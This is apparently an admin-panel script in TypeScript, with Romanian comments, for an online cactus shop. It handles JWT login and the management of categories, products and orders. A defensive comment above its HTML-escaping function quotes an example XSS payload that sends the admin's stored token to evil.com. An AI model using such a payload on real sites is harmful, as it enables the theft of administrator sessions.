// --- INTERFEȚE ---
interface Cactus {
    id: number;
    name: string;
    price: number;
    description: string;
    category: string;
    imageUrl: string;
}

interface Order {
    id: number;
    customerName: string;
    address: string;
    totalPrice: number;
    purchasedItems: string;
}

interface Category {
    id: number;
    name: string;
}

// --- UTILITARE JWT ---
function getAuthHeader() {
    return { 'Authorization': `Bearer ${localStorage.getItem('jwtToken')}` };
}

// --- UTILITARĂ ANTI-XSS ---
// Scapă orice text introdus de utilizator înainte de a-l pune în innerHTML.
// FĂRĂ asta, un client poate trimite o comandă cu nume precum:
// <img src=x onerror="fetch('https://evil.com?t='+localStorage.jwtToken)">
// și fură token-ul de admin data viitoare când verifici comenzile.
function escapeHtml(unsafe: string | null | undefined): string {
    if (unsafe === null || unsafe === undefined) return "";
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// --- 1. SISTEMUL DE LOGIN ---
const loginBtn = document.getElementById('login-btn');
if (loginBtn) {
    loginBtn.addEventListener('click', async () => {
        const userInput = (document.getElementById('admin-user') as HTMLInputElement).value;
        const passInput = (document.getElementById('admin-pass') as HTMLInputElement).value;

        try {
            const response = await fetch('cactus-shop-production.up.railway.app/api/auth/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: userInput, password: passInput })
            });

            if (response.ok) {
                const data = await response.json();
                localStorage.setItem('jwtToken', data.token); // Salvăm token-ul

                document.getElementById('login-container')!.style.display = "none";
                document.getElementById('admin-panel')!.style.display = "block";

                // Încărcăm toate datele imediat ce ne-am logat
                fetchAdminCategories();
                fetchAdminCacti();
                fetchAdminOrders();
            } else {
                alert("❌ Date de autentificare incorecte (Respinse de Server)!");
            }
        } catch (error) {
            alert("Nu am putut contacta serverul pentru autentificare.");
        }
    });
}

// --- 2. GESTIUNE CATEGORII ---
async function fetchAdminCategories() {
    try {
        const response = await fetch('cactus-shop-production.up.railway.app/api/categories');
        const categories: Category[] = await response.json();

        // A. Populează lista cu butoane de ștergere
        const list = document.getElementById('admin-categories-list');
        if (list) {
            list.innerHTML = categories.map(cat =>
                `<li style="background: #fdf2b8; border: 1px solid #2f694b; color: #2f694b; padding: 8px 12px; border-radius: 20px; display: flex; align-items: center; gap: 10px; font-weight: bold;">
                    ${escapeHtml(cat.name)} 
                    <button class="delete-cat-btn" data-id="${cat.id}" style="background: #d32f2f; color: white; border: none; border-radius: 50%; width: 22px; height: 22px; cursor: pointer; font-size: 10px; font-weight: bold;">X</button>
                </li>`
            ).join("");

            // Activăm butoanele de ștergere a categoriei (necesită Auth)
            document.querySelectorAll('.delete-cat-btn').forEach(btn => {
                btn.addEventListener('click', async (e) => {
                    const id = (e.target as HTMLButtonElement).getAttribute('data-id');
                    if (confirm("Sigur ștergi această categorie?")) {
                        await fetch(`cactus-shop-production.up.railway.app/api/categories/${id}`, {
                            method: 'DELETE',
                            headers: getAuthHeader()
                        });
                        fetchAdminCategories(); // Reîncărcăm
                    }
                });
            });
        }

        // B. Populează Dropdown-ul din formularul de adăugare produs
        const select = document.getElementById('new-cactus-category') as HTMLSelectElement;
        if (select) {
            select.innerHTML = categories.map(cat => `<option value="${escapeHtml(cat.name)}">${escapeHtml(cat.name)}</option>`).join("");
        }
    } catch (error) {
        console.error("Eroare la preluarea categoriilor:", error);
    }
}

// Adăugare categorie nouă (necesită Auth)
const addCategoryBtn = document.getElementById('add-category-btn');
if (addCategoryBtn) {
    addCategoryBtn.addEventListener('click', async () => {
        const nameInput = document.getElementById('new-category-name') as HTMLInputElement;
        if (!nameInput.value.trim()) return;

        await fetch('cactus-shop-production.up.railway.app/api/categories', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', ...getAuthHeader() },
            body: JSON.stringify({ name: nameInput.value.trim() })
        });

        nameInput.value = "";
        fetchAdminCategories();
    });
}

// --- 3. GESTIUNE CACTUȘI (PRODUSE) ---
async function fetchAdminCacti() {
    try {
        const response = await fetch('cactus-shop-production.up.railway.app/api/cacti');
        const cacti: Cactus[] = await response.json();

        const container = document.getElementById('admin-cacti-list');
        if (!container) return;

        let htmlContent = "";
        for (let cactus of cacti) {
            const validImage = cactus.imageUrl ? cactus.imageUrl : "https://images.unsplash.com/photo-1459411552884-841db9b3cc2a?auto=format&fit=crop&w=400&q=80";
            htmlContent += `
                <div style="background: #fdf2b8; padding: 10px; border: 1px solid #2f694b; border-radius: 6px; text-align: center;">
                    <img src="${escapeHtml(validImage)}" style="width: 100%; height: 100px; object-fit: cover; border-radius: 4px;">
                    <h4 style="margin: 10px 0 5px 0; color: #2f694b;">${escapeHtml(cactus.name)}</h4>
                    <p style="margin: 0; color: #d32f2f; font-weight: bold;">${cactus.price} RON</p>
                    <button class="delete-cactus-btn" data-id="${cactus.id}" style="background-color: #d32f2f; color: white; padding: 5px; border: none; border-radius: 4px; cursor: pointer; width: 100%; margin-top: 10px; font-weight: bold;">
                        🗑️ Șterge
                    </button>
                </div>
            `;
        }
        container.innerHTML = htmlContent;

        // Ștergere cactus (necesită Auth)
        document.querySelectorAll('.delete-cactus-btn').forEach(button => {
            button.addEventListener('click', async (event) => {
                const btn = event.target as HTMLButtonElement;
                const cactusId = Number(btn.getAttribute('data-id'));

                if (confirm("Ești sigur că vrei să ștergi acest produs?")) {
                    await fetch(`cactus-shop-production.up.railway.app/api/cacti/${cactusId}`, {
                        method: 'DELETE',
                        headers: getAuthHeader()
                    });
                    fetchAdminCacti();
                }
            });
        });
    } catch (error) {
        console.error("Eroare la preluarea produselor:", error);
    }
}

// Adăugare cactus nou (necesită Auth)
const addCactusBtn = document.getElementById('add-new-cactus-btn');
if (addCactusBtn) {
    addCactusBtn.addEventListener('click', async () => {
        const newCactus = {
            name: (document.getElementById('new-cactus-name') as HTMLInputElement).value.trim(),
            price: Number((document.getElementById('new-cactus-price') as HTMLInputElement).value),
            category: (document.getElementById('new-cactus-category') as HTMLSelectElement).value, // Preluăm din select!
            description: (document.getElementById('new-cactus-desc') as HTMLInputElement).value.trim(),
            imageUrl: (document.getElementById('new-cactus-image') as HTMLInputElement).value.trim()
        };

        if (!newCactus.name || !newCactus.price || !newCactus.category) {
            alert("Completează toate câmpurile obligatorii!");
            return;
        }

        await fetch('cactus-shop-production.up.railway.app/api/cacti', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', ...getAuthHeader() },
            body: JSON.stringify(newCactus)
        });

        // Golim inputurile
        (document.getElementById('new-cactus-name') as HTMLInputElement).value = "";
        (document.getElementById('new-cactus-price') as HTMLInputElement).value = "";
        (document.getElementById('new-cactus-desc') as HTMLInputElement).value = "";
        (document.getElementById('new-cactus-image') as HTMLInputElement).value = "";

        fetchAdminCacti();
    });
}

// --- 4. VIZUALIZARE COMENZI (necesită Auth) ---
async function fetchAdminOrders() {
    try {
        const response = await fetch('cactus-shop-production.up.railway.app/api/orders', {
            headers: getAuthHeader()
        });

        if (!response.ok) throw new Error('Neautorizat');

        const orders: Order[] = await response.json();

        const tableBody = document.getElementById('admin-orders-list');
        if (!tableBody) return;

        if (orders.length === 0) {
            tableBody.innerHTML = `<tr><td colspan="5" style="text-align: center; padding: 20px; color: #2f694b;">Nicio comandă momentan. E timpul pentru marketing! 🌵</td></tr>`;
            return;
        }

        let htmlContent = "";
        for (let order of orders) {
            htmlContent += `
                <tr style="border-bottom: 1px solid #eee;">
                    <td style="padding: 12px; font-weight: bold; color: #2f694b;">#${order.id}</td>
                    <td style="padding: 12px; color: #333;">${escapeHtml(order.customerName)}</td>
                    <td style="padding: 12px; color: #333;">${escapeHtml(order.address)}</td>
                    <td style="padding: 12px; color: #2f694b;">${escapeHtml(order.purchasedItems)}</td>
                    <td style="padding: 12px; color: #d32f2f; font-weight: bold;">${order.totalPrice} RON</td>
                </tr>
            `;
        }
        tableBody.innerHTML = htmlContent;

    } catch (error) {
        console.error("Eroare la preluarea comenzilor:", error);
        document.getElementById('admin-orders-list')!.innerHTML = `<tr><td colspan="5" style="color: red;">Eroare de securitate. Nu poți accesa comenzile.</td></tr>`;
    }
}